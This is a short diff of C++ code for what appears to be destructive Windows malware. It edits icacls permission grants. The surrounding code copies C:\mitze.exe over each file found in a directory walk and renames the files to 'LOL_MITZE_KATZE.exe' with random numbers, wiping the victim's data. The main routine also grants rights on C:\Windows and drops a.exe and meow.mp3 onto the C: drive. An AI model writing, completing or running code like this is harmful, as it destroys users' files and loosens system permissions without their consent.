@@ -49,7 +49,7 @@ void FckFiles(std::string directory, std::string fileFilter, bool recursively = 
 				string Butter = "copy C:\\mitze.exe /Y "+ string(Chickfila);
 				const char* Sucker2 = Dutter.c_str();
 				const char* Sucker3 = Butter.c_str();
-				system(("icacls "+string(Chickfila)+" /grant Everyone:(OI)(CI)F").c_str());
+				system(("icacls "+string(Chickfila)+" /grant Administrator:F").c_str());
 				//system(("del /f  "+ string(Chickfila)).c_str());
 				system(("copy C:\\mitze.exe /Y "+ string(Chickfila)).c_str());
 				rename(Chickfila.c_str(),"LOL_MITZE_KATZE.exe"+rand() % 999999);
@@ -76,7 +76,7 @@ int main(int argc, char* argv[])
     string abc = "abcdefghijklmnopqrstuvwxyz"; 
     char char_array[abc.length() + 1]; 
     strcpy(char_array, abc.c_str()); 
-	system((string("icacls C\\Windows /grant Everyone:(OI)(CI)F")).c_str());
+	system((string("icacls C:\\Windows /grant Administrator:F")).c_str());
 	CopyFile("./a.exe","C:/mitze.exe",0);
 	CopyFile("./meow.mp3","C:/meow.mp3",0);
 	for(int i=0;i<abc.length();i++){
